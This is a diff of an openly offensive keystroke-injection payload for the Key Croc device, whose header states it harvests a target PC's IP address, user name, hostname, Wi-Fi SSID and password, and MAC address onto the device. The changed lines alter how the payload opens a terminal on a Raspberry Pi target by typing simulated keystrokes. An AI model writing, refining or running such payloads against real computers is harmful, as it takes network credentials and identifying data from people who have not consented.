@@ -3,7 +3,7 @@
 #                This will collect some data off target PC (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3.7
+# Version:       1.3.8
 # Category:      Key Croc
 
 MATCH crocpot
@@ -167,18 +167,9 @@ LINUX)
 	#---> After TARGET_HOSTNAME scan case TARGET_HOSTNAME value
 	case $TARGET_HOSTNAME in
 raspberrypi)
-	#---> Copy LXTerminal to desktop
-	Q GUI d
-	Q CONTROL-ALT-F1
-	sleep 1
-	Q STRING "cp -u /usr/share/applications/lxterminal.* /home/\$(whoami)/Desktop"
-	Q ENTER
-	Q ALT-F7
 	#---> Start Raspberry pi 4 LXTerminal
-	sleep 1
-	Q STRING "LXTerminal"
-	Q ENTER
-	Q ENTER
+	Q CONTROL-ALT-d
+	Q CONTROL-ALT-t
 	sleep 2
 	#---> Place keycroc usb drive into variable
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
